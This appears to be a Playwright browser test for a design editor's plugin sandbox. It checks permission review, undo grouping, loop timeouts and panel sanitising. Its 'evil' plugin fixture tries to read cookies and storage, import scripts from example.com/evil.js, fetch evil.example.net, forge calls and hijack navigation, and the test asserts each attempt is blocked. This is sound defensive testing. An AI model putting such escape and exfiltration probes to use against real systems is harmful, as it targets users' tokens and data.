/* HOOLA DESIGN - D8a plugin runtime (hd-plugins.js + plugin-runner.js + design/plugins.py) against a REAL server.
   Checked in a real Chromium:
   - install through the review dialog (permissions in plain words, her Install), run from the main menu: a plugin makes
     3 rectangles and ONE undo removes all three (redo brings them back);
   - she unticks "Change your design" in the review: the plugin's hoola.create is refused, nothing is made;
   - a malicious plugin gets nothing: no window / document / localStorage / cookie in its worker, fetch / WebSocket /
     importScripts / eval blocked, hoola.fetch to her own server (http) and to a host she did not grant refused, unknown
     methods refused, a panel refused (ui: false); the runner DOCUMENT itself has an opaque origin (localStorage and
     cookie throw, parent.localStorage throws, its fetch and an outside <img> are blocked by its CSP, top navigation is
     blocked); her console token is nowhere in anything the plugin received;
   - an endless loop is stopped after the limit, the iframe is gone, she is told, the editor answered the whole time,
     and only one command runs at a time;
   - a ui: true plugin shows its panel (its own sandboxed iframe), a click inside it reaches the plugin, scripts in its
     html never run, Close ends it;
   - new code = refused until she approves again; "Write a plugin" -> the editor with line numbers -> review -> installed.

   Run:  HD_BASE=http://127.0.0.1:<port> HD_KEY=<api key> node server/tests/web/design_plugins_test.js
         (server/tests/test_v0825_design_plugins.py starts the server on a free port with a fresh database)
   Exit 0 = pass, 1 = fail, 77 = could not run here (no playwright / no Chromium / no server). Last line = JSON. */
'use strict';
const assert = require('node:assert/strict'), crypto = require('crypto');
const BASE = (process.env.HD_BASE || '').replace(/\/+$/, ''), KEY = process.env.HD_KEY || 'itest-key';
let checks = 0;
const ok = (cond, what) => { assert.ok(cond, what); checks++; };
const eq = (a, b, what) => { assert.deepEqual(a, b, what); checks++; };
const sha = s => crypto.createHash('sha256').update(s, 'utf8').digest('hex');

async function rest(method, p, body) {
  const headers = {Authorization: 'Bearer ' + KEY};
  if (body !== undefined) headers['Content-Type'] = 'application/json';
  const r = await fetch(BASE + '/api/design' + p, {method, headers, body: body === undefined ? undefined : JSON.stringify(body)});
  const text = await r.text();
  let data = null; try { data = JSON.parse(text); } catch (e) { data = text; }
  return {status: r.status, data};
}
async function put(manifest, code, grant) {
  const got = await rest('POST', '/plugins', {manifest, code});
  assert.equal(got.status, 200, JSON.stringify(got.data));
  if (grant) { const g = await rest('POST', '/plugins/' + manifest.id + '/grant', {permissions: grant, code_sha: sha(code)}); assert.equal(g.status, 200, JSON.stringify(g.data)); }
  return got.data.plugin;
}

const THREE = {id: 'three', name: 'Three squares', version: '1.0.0', description: 'Makes three squares on the page.', permissions: ['read', 'edit'], menu: [{label: 'Make three', command: 'make'}]};
const THREE_CODE = [
  'const page = await hoola.page();',
  'for (let i = 0; i < 3; i++) await hoola.create("RECT", page.id, {name: "Sq " + i, x: 40 + i * 120, y: 40, w: 100, h: 100, fills: [{type: "solid", color: "#6E55F0", opacity: 1, visible: true}]});',
  'hoola.notify("Made 3 squares for " + command);'].join('\n');
const NOEDIT = {id: 'noedit', name: 'Sneaky maker', permissions: ['read', 'edit'], menu: [{label: 'Run', command: 'run'}]};
const NOEDIT_CODE = 'const p = await hoola.page();\ntry { await hoola.create("RECT", p.id, {name: "Should not exist"}); await hoola.notify("CREATED"); }\ncatch (e) { await hoola.notify("REFUSED: " + e.message); }';
const EVIL = {id: 'evil', name: 'Evil', permissions: ['read', 'edit', 'net:example.com'], menu: [{label: 'Run', command: 'run'}]};
const EVIL_CODE = `
const r = {seen: []};
const note = (k, v) => { r[k] = v; };
note('window', typeof window); note('document', typeof document); note('localStorage', typeof localStorage);
note('parent', typeof parent); note('top', typeof top); note('rtc', typeof RTCPeerConnection); note('image', typeof Image);
note('origin', self.origin);
try { note('cookie', typeof document === 'undefined' ? 'no document' : document.cookie); } catch (e) { note('cookie', 'threw'); }
try { eval('1'); note('eval', 'ran'); } catch (e) { note('eval', 'blocked'); }
try { new Function('return 1')(); note('fn', 'ran'); } catch (e) { note('fn', 'blocked'); }
try { importScripts('https://example.com/evil.js'); note('import', 'ran'); } catch (e) { note('import', 'blocked'); }
const tryFetch = async (u, o) => { try { const x = await fetch(u, o); return 'GOT ' + x.status; } catch (e) { return 'blocked'; } };
note('fetchApi', await tryFetch(${JSON.stringify(BASE)} + '/api/design/files'));
note('fetchOut', await tryFetch('https://example.com/'));
note('ws', await new Promise(res => { try { const w = new WebSocket('ws://127.0.0.1:1/x'); w.onopen = () => res('open'); w.onerror = () => res('blocked'); setTimeout(() => res('blocked'), 800); } catch (e) { res('blocked'); } }));
const refuse = async (k, p) => { try { const v = await p; r.seen.push(v); note(k, 'ALLOWED'); } catch (e) { note(k, 'refused: ' + e.message); } };
await refuse('proxyHttp', hoola.fetch(${JSON.stringify(BASE)} + '/api/design/files'));
await refuse('proxyHost', hoola.fetch('https://127.0.0.1/api/design/files'));
await refuse('proxyOther', hoola.fetch('https://evil.example.net/'));
await refuse('panel', hoola.ui.show('<p>hi</p>'));
await refuse('badProp', hoola.create('RECT', (await hoola.page()).id, {onclick: 'x'}));
await refuse('ghost', hoola.set('9:999', {x: 1}));
await refuse('root', hoola.remove(['0:0']));
await refuse('export', hoola.exportPNG((await hoola.page()).id));
await refuse('store', hoola.storage.set('a', 1));
const forged = await new Promise(res => { const id = 777001; const old = self.onmessage; self.onmessage = e => { if (e.data && e.data.id === id) { self.onmessage = old; res(e.data.ok ? 'ALLOWED' : 'refused: ' + e.data.err); } else old(e); }; postMessage({t: 'call', id: id, m: 'eval', a: ['1']}); });
note('forged', forged);
r.seen.push(await hoola.selection(), await hoola.page(), hoola.manifest, hoola.command);
await new Promise(res => setTimeout(res, 1500));
const page = await hoola.page();
await hoola.create('TEXT', page.id, {name: 'evil-report', chars: JSON.stringify(r), x: 0, y: 600});
`;
const SPIN = {id: 'spin', name: 'Spinner', permissions: ['read'], menu: [{label: 'Run', command: 'run'}]};
const SPIN_CODE = 'await hoola.page();\nwhile (true) { }';
const PANEL = {id: 'panel', name: 'Counter', permissions: ['read'], ui: true, menu: [{label: 'Open', command: 'open'}]};
const PANEL_CODE = [
  'await hoola.ui.show(\'<h3 id="t">Hello from a panel</h3><button data-action="count" id="b">Count</button>\' +',
  '  \'<script>window.__ran = 1</script><img id="im" src="https://example.com/x.png"><a id="lk" href="https://example.com/">out</a><form id="fm"><input name="q" value="z"></form>\', {title: "Counter", width: 300, height: 260});',
  'hoola.ui.on(async msg => { if (msg.action === "count") { const s = await hoola.selection(); await hoola.ui.show(\'<p id="n">\' + s.length + " selected</p>"); } });'].join('\n');

async function main() {
  if (!BASE) { console.log('SKIP: HD_BASE is not set (run it through test_v0825_design_plugins.py)'); process.exit(77); }
  let chromium;
  try { ({chromium} = require(process.env.PLAYWRIGHT_MODULE || 'playwright')); } catch (e) { console.log('SKIP: playwright is not installed'); process.exit(77); }
  try { const r = await fetch(BASE + '/console/design'); if (r.status !== 200) throw new Error('status ' + r.status); } catch (e) { console.log('SKIP: no Hoola Design server at ' + BASE + ' (' + e.message + ')'); process.exit(77); }
  let browser;
  try { browser = await chromium.launch({executablePath: process.env.HOOLA_CHROMIUM || process.env.CHROMIUM_EXECUTABLE || undefined, headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage']}); }
  catch (e) { console.log('SKIP: Chromium can not start here: ' + String(e.message).split('\n')[0]); process.exit(77); }
  const errors = [], requests = [];
  try {
    const file = (await rest('POST', '/files', {name: 'Plugin playground'})).data;
    ok(file && file.id, 'a file was made');
    await put(EVIL, EVIL_CODE, EVIL.permissions);
    await put(SPIN, SPIN_CODE, SPIN.permissions);
    await put(PANEL, PANEL_CODE, PANEL.permissions);

    const ctx = await browser.newContext({viewport: {width: 1440, height: 900}});
    await ctx.addCookies([{name: 'hoola_secret_cookie', value: 'cookie-' + KEY, url: BASE}]);
    const page = await ctx.newPage();
    page.on('pageerror', e => errors.push(e.message + ' ' + String(e.stack || '').split('\n').slice(1, 3).join(' ')));
    page.on('response', rs => requests.push(rs.url()));   /* a load the CSP blocked never gets an answer */
    await page.route(/^https:\/\/fonts\.(googleapis|gstatic)\.com\//, r => r.fulfill({contentType: 'text/css', body: ''}));
    await page.addInitScript(key => { if (window.top === window) localStorage.setItem('hoola.console.token', key); }, KEY);   /* not in the sandboxed frame */
    await page.goto(BASE + '/console/design#/f/' + file.id);
    await page.waitForFunction(() => window.HD && HD.ui && HD.ui.mounted && HD.net.status === 'live' && HD.store.pages().length > 0 && HD.plugins, null, {timeout: 25000});
    const rects = () => page.evaluate(() => { let n = 0; HD.store.walk(HD.sel.page, (id, nd) => { if (nd.type === 'RECT') n++; }); return n; });
    const toast = re => page.waitForFunction(src => new RegExp(src).test((document.querySelector('.hd-toast.on') || {}).textContent || ''), re.source, {timeout: 10000});

    /* ------------------------------------------------------------ install through the review dialog */
    await page.evaluate(([m, c]) => { window.__inst = HD.plugins.install(m, c); }, [THREE, THREE_CODE]);
    await page.locator('.hdp-review').waitFor();
    const reviewText = await page.locator('.hdp-review').innerText();
    ok(/Read your design/.test(reviewText) && /Change your design/.test(reviewText), 'the review lists every permission in plain words');
    ok(reviewText.indexOf('hoola.create("RECT"') >= 0, 'the review shows the code');
    eq(await page.evaluate(() => document.querySelectorAll('.hdp-review .hdp-gut')[0].textContent.split('\n').length), 3, 'the code view has line numbers');
    ok((await rest('GET', '/plugins/three')).status === 404, 'nothing is installed before her Install');
    await page.locator('.hdp-review .hd-btn.pri', {hasText: 'Install'}).click();
    const inst = await page.evaluate(() => window.__inst);
    eq([inst.installed, inst.granted], [true, ['read', 'edit']], 'installed and approved with what she ticked');
    const srv = (await rest('GET', '/plugins/three')).data.plugin;
    ok(srv.approved && srv.code_sha === sha(THREE_CODE), 'the server holds the approval for exactly that code');

    /* ------------------------------------------------------------ run from the main menu: 3 rectangles, one undo step */
    eq(await rects(), 0, 'the page starts empty');
    await page.locator('.hd-top button[aria-label="Main menu"]').click();
    await page.locator('.hd-mi', {hasText: 'Plugins'}).first().click();
    await page.locator('.hd-mi', {hasText: 'Three squares'}).click();
    await toast(/Made 3 squares for make/);
    await page.waitForFunction(() => !HD.plugins.active);
    eq(await rects(), 3, 'the plugin made three rectangles');
    await page.waitForFunction(() => HD.net.pending() === 0);
    const doc = (await rest('GET', '/files/' + file.id + '/doc')).data.doc;
    eq(Object.values(doc.nodes).filter(n => n.type === 'RECT').length, 3, 'they reached the server as normal ops');
    eq(await page.evaluate(() => HD.store.undoLabel()), 'Plugin: Three squares', 'one undo step named after the plugin');
    await page.evaluate(() => HD.store.undo());
    eq(await rects(), 0, 'ONE undo removes all three');
    await page.evaluate(() => HD.store.redo());
    eq(await rects(), 3, 'redo brings them back');
    await page.evaluate(() => HD.store.undo());

    /* ------------------------------------------------------------ she unticks "Change your design" */
    await page.evaluate(([m, c]) => { window.__inst2 = HD.plugins.install(m, c); }, [NOEDIT, NOEDIT_CODE]);
    await page.locator('.hdp-review').waitFor();
    await page.locator('.hdp-review input[data-perm="edit"]').uncheck();
    await page.locator('.hdp-review .hd-btn.pri', {hasText: 'Install'}).click();
    eq((await page.evaluate(() => window.__inst2)).granted, ['read'], 'only read was approved');
    const r2 = await page.evaluate(() => HD.plugins.run('noedit'));
    ok(r2.ok && r2.refused === 1 && r2.edits === 0, 'the run ended, its create was refused: ' + JSON.stringify(r2));
    await toast(/REFUSED: You did not give this plugin permission for changing your design/);
    eq(await rects(), 0, 'nothing was made');

    /* ------------------------------------------------------------ a malicious plugin */
    const evilRun = page.evaluate(() => HD.plugins.run('evil'));
    await page.waitForSelector('iframe.hdp-frame', {state: 'attached'});
    eq(await page.evaluate(() => { const f = document.querySelector('iframe.hdp-frame'); return [f.getAttribute('sandbox'), new URL(f.src).pathname]; }), ['allow-scripts', '/api/design/plugin-frame'], 'the plugin frame: allow-scripts only, the runner page');
    const hostView = await page.evaluate(() => { const f = document.querySelector('iframe.hdp-frame'), out = {};
      try { out.doc = typeof f.contentWindow.document.body; } catch (e) { out.doc = 'blocked'; }
      try { out.ls = typeof f.contentWindow.localStorage; } catch (e) { out.ls = 'blocked'; }
      try { out.href = String(f.contentWindow.location.href); } catch (e) { out.href = 'blocked'; }
      return out; });
    eq(hostView, {doc: 'blocked', ls: 'blocked', href: 'blocked'}, 'the frame is another origin even from the editor’s side');
    let fr = null;
    for (let i = 0; i < 50 && !fr; i++) { fr = page.frames().find(f => /\/api\/design\/plugin-frame/.test(f.url())); if (!fr) await page.waitForTimeout(50); }
    ok(fr, 'the runner frame is there');
    await fr.waitForFunction(() => document.getElementById('hp-ui'));
    const inside = await fr.evaluate(async base => {
      const o = {};
      o.origin = self.origin;
      try { o.ls = localStorage.getItem('hoola.console.token'); } catch (e) { o.ls = 'threw ' + e.name; }
      try { o.cookie = document.cookie; } catch (e) { o.cookie = 'threw ' + e.name; }
      try { o.parentLs = parent.localStorage.getItem('hoola.console.token'); } catch (e) { o.parentLs = 'threw ' + e.name; }
      try { o.parentDoc = parent.document.title; } catch (e) { o.parentDoc = 'threw ' + e.name; }
      o.fetch = await fetch(base + '/api/design/files').then(r => 'GOT ' + r.status, () => 'blocked');
      o.img = await new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = base + '/static/hoola-icon-192.png?from=plugin'; setTimeout(() => res('blocked'), 1500); });
      try { top.location.href = base + '/console/?hijacked=1'; o.top = 'no error'; } catch (e) { o.top = 'threw ' + e.name; }
      return o; }, BASE);
    eq([inside.origin, inside.ls, inside.cookie, inside.parentLs, inside.parentDoc, inside.fetch, inside.img],
      ['null', 'threw SecurityError', 'threw SecurityError', 'threw SecurityError', 'threw SecurityError', 'blocked', 'blocked'], 'the runner page has an opaque origin and no network: ' + JSON.stringify(inside));
    const er = await evilRun;
    ok(er.ok, 'the evil plugin ran to its end (its tricks were simply refused): ' + JSON.stringify(er));
    await page.waitForTimeout(300);
    ok(page.url().indexOf('hijacked') < 0 && /\/console\/design/.test(page.url()), 'the frame could not navigate the editor away');
    ok(!requests.some(u => /from=plugin/.test(u)), 'the outside picture never got an answer (blocked before it left)');
    const report = JSON.parse(await page.evaluate(() => { let t = ''; HD.store.walk(HD.sel.page, (id, n) => { if (n.name === 'evil-report') t = n.chars; }); return t; }));
    eq([report.window, report.document, report.localStorage, report.parent, report.top, report.rtc, report.image, report.origin, report.cookie],
      ['undefined', 'undefined', 'undefined', 'undefined', 'undefined', 'undefined', 'undefined', 'null', 'no document'], 'inside its worker the plugin has no window, DOM, storage or WebRTC');
    eq([report.eval, report.fn, report.import, report.fetchApi, report.fetchOut, report.ws], ['blocked', 'blocked', 'blocked', 'blocked', 'blocked', 'blocked'], 'eval, imports and every network door are shut: ' + JSON.stringify(report));
    ok(/^refused: A plugin may only fetch https/.test(report.proxyHttp), 'hoola.fetch to her own server over http is refused');
    ok(/^refused: This plugin may not talk to 127\.0\.0\.1/.test(report.proxyHost) && /^refused: This plugin may not talk to evil\.example\.net/.test(report.proxyOther), 'hosts she did not grant are refused');
    ok(/^refused: You did not give this plugin permission for showing a panel/.test(report.panel), 'a panel needs ui: true');
    ok(/^refused: 'onclick' is not a layer property/.test(report.badProp) && /does not exist/.test(report.ghost) && /can not be removed/.test(report.root), 'only real properties of real layers');
    ok(/permission for making pictures/.test(report.export) && /permission for keeping data/.test(report.store), 'export and storage need their permissions');
    ok(/^refused: hoola has no "eval"/.test(report.forged), 'a forged call to an unknown method is refused');
    ok(JSON.stringify(report).indexOf(KEY) < 0 && JSON.stringify(report).indexOf('cookie-') < 0, 'her token and cookie are nowhere in what the plugin received');
    eq(await page.evaluate(() => document.querySelectorAll('iframe.hdp-frame').length), 0, 'the frame is gone after the run');

    /* ------------------------------------------------------------ an endless loop: stopped, the editor stays responsive */
    await page.evaluate(() => { HD.plugins.config.limitMs = 3000; window.__spin = HD.plugins.run('spin').then(r => { window.__spinDone = r; window.__spinAt = performance.now(); return r; }); window.__spinFrom = performance.now(); });
    await page.waitForFunction(() => HD.plugins.active && HD.plugins.active.state === 'running');
    const busy = await page.evaluate(() => HD.plugins.run('three'));
    eq([busy.ok, busy.error], [false, 'busy'], 'only one plugin command at a time');
    let worst = 0;
    for (let i = 0; i < 8; i++) {
      const t0 = Date.now();
      const v = await page.evaluate(() => new Promise(res => requestAnimationFrame(() => res(HD.store.count()))));
      worst = Math.max(worst, Date.now() - t0);
      ok(v > 0, 'the editor answers while the plugin spins');
      await page.waitForTimeout(150);
    }
    ok(worst < 1000, 'the editor never froze (worst answer ' + worst + ' ms)');
    await page.waitForFunction(() => window.__spinDone, null, {timeout: 15000});
    const spun = await page.evaluate(() => ({r: window.__spinDone, ms: window.__spinAt - window.__spinFrom}));
    ok(!spun.r.ok && /took longer than 3 seconds/.test(spun.r.error), 'the loop was stopped: ' + JSON.stringify(spun.r));
    ok(spun.ms > 2500 && spun.ms < 9000, 'stopped after the limit (' + Math.round(spun.ms) + ' ms)');
    eq(await page.evaluate(() => document.querySelectorAll('iframe.hdp-frame').length), 0, 'its iframe (and worker) is gone');
    await toast(/Spinner took longer than 3 seconds/);
    await page.evaluate(() => { HD.plugins.config.limitMs = 10000; });
    ok((await page.evaluate(() => HD.plugins.run('three'))).ok, 'another plugin runs fine afterwards');
    eq(await rects(), 3, 'and did its work');
    await page.evaluate(() => HD.store.undo());

    /* ------------------------------------------------------------ a panel plugin */
    const panelRun = page.evaluate(() => HD.plugins.run('panel').then(r => { window.__panelDone = r; return r; }));
    await page.locator('.hdp-panel').waitFor({state: 'visible'});
    eq(await page.locator('.hdp-panel .hdp-ptitle').innerText(), 'Counter · Counter', 'the panel carries the plugin name');
    eq(await page.evaluate(() => { const f = document.querySelector('.hdp-panel iframe.hdp-frame'); return f && f.getAttribute('sandbox'); }), 'allow-scripts', 'the panel IS the sandboxed iframe');
    const pf = page.frameLocator('.hdp-panel iframe.hdp-frame');
    await pf.locator('#t').waitFor();
    eq(await pf.locator('#t').innerText(), 'Hello from a panel', 'its html is drawn inside the sandbox');
    const cleaned = await pf.locator('body').evaluate(() => ({script: document.querySelectorAll('#hp-ui script').length, ran: window.__ran || 0, img: (document.getElementById('im') || {}).getAttribute ? document.getElementById('im').getAttribute('src') : 'gone', a: document.getElementById('lk').getAttribute('href'), form: !!document.getElementById('fm')}));
    eq(cleaned, {script: 0, ran: 0, img: null, a: null, form: false}, 'scripts, outside pictures, outside links and forms are taken out');
    await page.evaluate(() => { const ids = HD.store.children(HD.sel.page).slice(0, 2); HD.sel.set(ids); });
    await pf.locator('#b').click();
    await pf.locator('#n').waitFor();
    ok(/selected/.test(await pf.locator('#n').innerText()), 'a click inside the panel reached the plugin');
    ok(await page.evaluate(() => !!HD.plugins.active && HD.plugins.active.state === 'idle'), 'the plugin stays open with its panel');
    await page.locator('.hdp-panel button[aria-label="Close the plugin"]').click();
    ok((await panelRun).ok, 'Close ends it');
    eq(await page.evaluate(() => [document.querySelectorAll('.hdp-panel').length, !!HD.plugins.active]), [0, false], 'the panel is gone');

    /* ------------------------------------------------------------ new code asks again */
    await put(THREE, THREE_CODE + '\n// a quiet change', null);
    await page.evaluate(() => HD.plugins.list(true));
    const stale = await page.evaluate(() => HD.plugins.run('three'));
    ok(!stale.ok && /not been approved/.test(stale.error), 'changed code is refused until she looks again: ' + stale.error);
    await page.evaluate(() => { window.__ap = HD.plugins.approve('three'); });
    await page.locator('.hdp-review').waitFor();
    ok(/Its code changed after you approved it/.test(await page.locator('.hdp-review').innerText()), 'the review says the code changed');
    await page.locator('.hdp-review .hd-btn.pri', {hasText: 'Approve'}).click();
    ok((await page.evaluate(() => window.__ap)).installed, 'approved again');
    ok((await page.evaluate(() => HD.plugins.run('three'))).ok, 'and it runs');
    await page.evaluate(() => HD.store.undo());

    /* ------------------------------------------------------------ the Plugins dialog + "Write a plugin" */
    await page.evaluate(() => HD.ui.run('plugins'));
    await page.locator('.hdp-manager .hdp-item').first().waitFor();
    eq(await page.locator('.hdp-manager .hdp-item').count(), 5, 'the Plugins dialog lists all five');
    await page.locator('.hdp-manager .hd-btn.pri', {hasText: 'Write a plugin'}).click();
    await page.locator('.hdp-editor textarea.hdp-edit').waitFor();
    const lines = await page.evaluate(() => [document.querySelector('.hdp-editor textarea.hdp-edit').value.split('\n').length, document.querySelector('.hdp-editor .hdp-gut').textContent.split('\n').length]);
    eq(lines[0], lines[1], 'the editor shows one line number per line');
    await page.locator('.hdp-editor input[aria-label="Name"]').fill('Hello squares');
    eq(await page.locator('.hdp-editor input[aria-label="Plugin id"]').inputValue(), 'hello-squares', 'the id follows the name');
    await page.locator('.hdp-editor .hd-btn.pri', {hasText: 'Save and install'}).click();
    await page.locator('.hdp-review').waitFor();
    await page.locator('.hdp-review .hd-btn.pri', {hasText: 'Install'}).click();
    await page.waitForFunction(() => !document.querySelector('.hdp-review'));
    ok((await rest('GET', '/plugins/hello-squares')).data.plugin.approved, 'the written plugin is installed and approved');
    ok((await page.evaluate(() => HD.plugins.run('hello-squares'))).ok && (await rects()) === 3, 'and it works');

    eq(errors, [], 'no script errors in the editor');
    console.log(JSON.stringify({ok: true, checks}));
    await browser.close();
  } catch (e) {
    console.error(e && e.stack || e);
    if (errors.length) console.error('page errors:', errors);
    console.log(JSON.stringify({ok: false, checks, error: String(e && e.message || e).slice(0, 500)}));
    try { await browser.close(); } catch (er) { /* closing */ }
    process.exit(1);
  }
}
main();
